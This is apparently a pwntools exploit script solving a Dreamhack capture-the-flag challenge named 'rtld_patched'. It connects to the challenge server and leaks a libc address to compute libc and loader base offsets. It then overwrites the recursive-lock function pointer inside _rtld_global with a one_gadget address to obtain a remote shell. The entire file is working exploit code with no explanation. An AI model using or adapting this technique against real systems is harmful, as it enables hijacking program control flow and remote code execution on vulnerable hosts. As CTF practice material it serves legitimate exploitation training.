#!/usr/bin/python3
from pwn import *

elf = context.binary = ELF("rtld_patched")
libc = elf.libc

local = False 
if local:
    p = process("./rtld_patched")
    gdb.attach(p,'''b*main+185\nc''')
else:
    p = remote('host3.dreamhack.games', 23953)

elf = context.binary = ELF('./rtld_patched', checksec=False)

p.recvuntilb(b"stdout: 0x")
libc_base = int(p.recv(12),16) - 3954208
system = libc_base + 0x045390
libc_start_main = libc_base + 0x20740
og1 = libc_base + 0x45216
og2 = libc_base + 0x4526a
og3 = libc_base + 0xf02a4
og4 = libc_base + 0xf1147
print("[+]Libc_base: ", hex(libc_base))
print("[+]Libc_system: ", hex(system))
print("[+]Libc_start_main: ", hex(libc_start_main))

ld_base = libc_base + 3973120
_rtld_global = ld_base + 2252864            
_dl_load_lock = _rtld_global + 2312         #change to 'sh'
rtld_recursive = _rtld_global + 3848        #change to system

print("[+]Ld_base: ", hex(ld_base))
print("[+]Ld_load_lock: ", hex(_dl_load_lock))
print("[+]Rtld_recursive: ", hex(rtld_recursive))


p.sendlineafter(b"addr: ", str(rtld_recursive))
print("[-]Addr: Done ")
p.sendlineafter(b"value: ", str(og4))
print("[-]Value: Done ")
p.interactive()
